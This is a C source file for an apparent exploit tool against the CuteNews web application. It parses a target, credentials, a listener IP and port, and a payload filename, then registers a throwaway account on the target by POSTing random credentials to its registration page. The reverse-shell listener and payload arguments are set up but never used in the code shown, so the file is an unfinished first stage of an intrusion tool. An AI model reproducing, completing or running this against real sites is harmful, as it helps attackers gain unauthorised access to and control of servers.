#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <curl/curl.h>
#include <stdbool.h>

// Structure to hold command-line arguments
typedef struct {
    char *target;
    char *uname;
    char *passw;
    char *lhost;
    int lport;
    char *file;
} Arguments;

// Function to parse command-line arguments
Arguments parse_args(int argc, char *argv[]) {
    Arguments args;
    args.lport = 4444; // Default port
    args.file = "payload"; // Default filename

    if (argc < 9) {
        fprintf(stderr, "Usage: %s -t target -u uname -p passw -lh lhost [-lp lport] [-f file]\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    for (int i = 1; i < argc; i++) {
        if (strcmp(argv[i], "-t") == 0) {
            args.target = argv[++i];
        } else if (strcmp(argv[i], "-u") == 0) {
            args.uname = argv[++i];
        } else if (strcmp(argv[i], "-p") == 0) {
            args.passw = argv[++i];
        } else if (strcmp(argv[i], "-lh") == 0) {
            args.lhost = argv[++i];
        } else if (strcmp(argv[i], "-lp") == 0) {
            args.lport = atoi(argv[++i]);
        } else if (strcmp(argv[i], "-f") == 0) {
            args.file = argv[++i];
        } else {
            fprintf(stderr, "Unknown option: %s\n", argv[i]);
            fprintf(stderr, "Usage: %s -t target -u uname -p passw -lh lhost [-lp lport] [-f file]\n", argv[0]);
            exit(EXIT_FAILURE);
        }
    }

    // Ensure all required arguments are provided
    if (!args.target || !args.uname || !args.passw || !args.lhost) {
        fprintf(stderr, "Error: Missing required arguments\n");
        fprintf(stderr, "Usage: %s -t target -u uname -p passw -lh lhost [-lp lport] [-f file]\n", argv[0]);
        exit(EXIT_FAILURE);
    }

    return args;
}

// Function to create the POST data string
char* create_post_data(const char *userpass) {
    // Define the buffer size; adjust if needed
    size_t buffer_size = 512;
    char *post_data = malloc(buffer_size);
    
    if (post_data == NULL) {
        perror("malloc failed");
        exit(EXIT_FAILURE);
    }

    // Construct the POST data string
    snprintf(post_data, buffer_size,
             "action=register&"
             "regusername=%s&"
             "regnickname=%s&"
             "regpassword=%s&"
             "confirm=%s&"
             "regemail=%s@pwn.ed",
             userpass, userpass, userpass, userpass, userpass);

    return post_data;
}

// Function to perform the POST request and get the status code
int perform_post_request(const char *url, const char *post_data) {
    CURL *curl;
    CURLcode res;
    long response_code = 0;

    // Initialize libcurl
    curl_global_init(CURL_GLOBAL_DEFAULT);
    curl = curl_easy_init();

    if (curl) {
        // Set the URL for the POST request
        curl_easy_setopt(curl, CURLOPT_URL, url);

        // Set the POST data
        curl_easy_setopt(curl, CURLOPT_POSTFIELDS, post_data);

        // Perform the POST request
        res = curl_easy_perform(curl);

        // Check for errors
        if (res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        } else {
            // Get the HTTP response status code
            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
        }

        // Cleanup
        curl_easy_cleanup(curl);
    }

    // Cleanup global libcurl resources
    curl_global_cleanup();

    return response_code;
}

// Function to generate a random string with internal memory allocation
char* generate_random_string(size_t length) {
    // Define the character set to choose from (A-Z, a-z, 0-9)
    const char charset[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz123456789";
    const size_t charset_size = sizeof(charset) - 1;

    // Allocate memory for the random string
    char *str = malloc(length + 1); // +1 for the null terminator
    if (str == NULL) {
        perror("malloc failed");
        exit(EXIT_FAILURE);
    }

    // Generate the random string
    for (size_t i = 0; i < length; i++) {
        int key = rand() % charset_size; // Pick a random index from charset
        str[i] = charset[key];          // Assign the character at that index
    }
    str[length] = '\0'; // Null-terminate the string

    return str;
}


int main(int argc, char *argv[]) {
    Arguments args = parse_args(argc, argv);
    
    char random_string[7]; // 6 letters + 1 for null terminator
    char postURL[256]; // Buffer to hold the formatted URL

    // Print parsed arguments (for demonstration purposes)
    printf("Target: %s\n", args.target);
    printf("Username: %s\n", args.uname);
    printf("Password: %s\n", args.passw);
    printf("Listener IP: %s\n", args.lhost);
    printf("Listener Port: %d\n", args.lport);
    printf("Filename: %s\n", args.file);


    bool allow_redirects = false;

    // Generate the random string
    char *randomCredentials = generate_random_string(6);

    // Create the POST data
    char *post_data = create_post_data(randomCredentials);

    snprintf(postURL, sizeof(postURL), "%s/CuteNews/index.php?register", args.target);
    //printf("%s", post_data);
    
    // Performs the POST request with status code
    int status_code = perform_post_request(postURL, post_data);
    
    if (status_code == 302 ){
        printf("Registration successful with username: %s and password: %s\n", randomCredentials, randomCredentials);
    }

    return 0;
}